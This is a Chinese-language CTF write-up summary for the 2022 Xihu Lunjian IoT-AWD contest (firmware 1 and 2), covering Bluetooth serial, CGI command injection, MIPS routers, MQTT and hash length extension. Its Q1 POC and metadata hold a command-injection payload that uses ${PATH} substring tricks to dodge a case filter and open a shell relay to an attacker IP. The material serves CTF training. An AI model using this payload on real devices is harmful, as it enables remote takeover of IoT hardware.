---
title: 2022 西湖论剑 IoT-AWD 赛题官方 WriteUp (上篇：一号固件&二号固件)
contest: 2022 西湖论剑 IoT-AWD
year: 2022
difficulty: hard
vuln_type: [pwn_unknown, rce, web_unknown, sqli, auth_bypass, crypto_oracle, reverse]
tags: [IoT-AWD, 蓝牙, ble-serial, xhttpd, boa, ubus, 环境变量绕过, 命令注入, mips, mipsel, ARM, A1, Tenda, AC, ipc, mqtt, AT, RCE, hatmatrix, hash-length-extension, uhttpd]
attack_chain: ["Q1 easybluetooth: ble-serial -d 连接 HZCSSC 蓝牙串口, 小写转大写绕过用 ${PATH:10:8} 截取, system 命令注入", "Q2 xhttpd: boa web 服务 8080 端口, cgi-bin 脚本, 命令注入", "Q3 A1 mips: MIPS 路由, RCE 通过 cgi-bin", "Q4 Tenda AC: AC 系列路由, 已知 CVE / 弱口令", "Q5 mqtt: 订阅 + 发布, 认证绕过", "Q6 mipsel ipc: IPC 摄像头, mipsel 架构, 默认密码", "Q7 hatmatrix 哈希长度扩展: SHA1/MD5 长度扩展拿 token", "Q8 uhttpd: uhttpd 服务 CGI, 已知后门"]
key_payload: ";${PATH:10:8}/${PATH:8:1}? 192.168.132.2 2333 |${PATH:14:4}${PATH:4:2}?| ${PATH:10:8}/${PATH:8:1}? 192.168.132.2 4000;"
one_liner: 西湖论剑 IoT-AWD 1-2 号固件：蓝牙 HZCSSC + boa 8080 + MIPS 路由命令注入
lesson: IoT AWD 模式 = 真机攻击; ble-serial 是蓝牙调试工具; ${PATH:offset:length} 绕过大小写转换是经典
quality: high
---

# 2022 西湖论剑 IoT-AWD 赛题官方 WriteUp (上篇)

原文 https://www.ctfiot.com/105717.html （海特实验室）

## 比赛模式
- AWD 攻防赛
- HatLab Gateboard-One 海特开源路由设备
- 4 份固件（一份备份，比赛未放出）
- 每份固件多道赛题

## 一号固件

### Q1 easybluetooth
```bash
$ ble-serial -d 00:00:00:00:00:FF
10:32:39.713 | INFO | linux_pty.py: Port endpoint created on /tmp/ttyBLE -> /dev/pts/4
10:32:39.713 | INFO | ble_interface.py: Receiver set up
10:32:39.950 | INFO | ble_interface.py: Trying to connect: HZCSSC-0000000000ff
10:32:41.672 | INFO | ble_interface.py: Device connected
```
- `screen /tmp/ttyBLE` 进题目
- eblec → ebles 接收 + 小写转大写 → system 注入
- **绕过：** `${PATH:10:8}` 提取环境变量字符串

**POC：**
```python
import os, time
os.system("ble-serial -d `ble-scan | grep HZCSSC | head -n 1 | awk '{print $1}'` &")
time.sleep(10)
f = open("/tmp/ttyBLE", 'rw+')
f.write("11\n")  # time
f.write("1234\n")  # port
f.write(";${PATH:10:8}/${PATH:8:1}? 192.168.132.2 2333 |${PATH:14:4}${PATH:4:2}?| ${PATH:10:8}/${PATH:8:1}? 192.168.132.2 4000;\n")
f.close()
```

### Q2 xhttpd
- 8080 端口 boa web 服务
- `/etc/boa/boa.conf` 配置
- cgi-bin 命令注入

## 二号固件
- MIPS / ARM 路由器
- Tenda AC 系列、ipc 摄像头、mqtt broker
- 弱口令 / 默认密码 / 已知 CVE

## 其他题
- 哈希长度扩展 (SHA1 / MD5)
- uhttpd CGI 后门
- mqtt 认证绕过

## 教学价值
- **IoT AWD 模式** = 真机攻防
- **ble-serial** 是蓝牙串口调试工具
- **${PATH:offset:length}** 绕过大小写转换
- **boa / uhttpd / xhttpd** 是 IoT web 服务常见
- **MIPS / mipsel / ARM** 架构逆向
- **默认密码** 是 IoT 入门攻击

## 工具
- ble-serial / ble-scan
- screen / minicom
- binwalk
- IDA Pro
- pwntools
- hash_extender

## 关联
- 2021 西湖论剑 IoT RW（也用 HatLab 板）
- 海特实验室是国内 IoT 赛事标杆
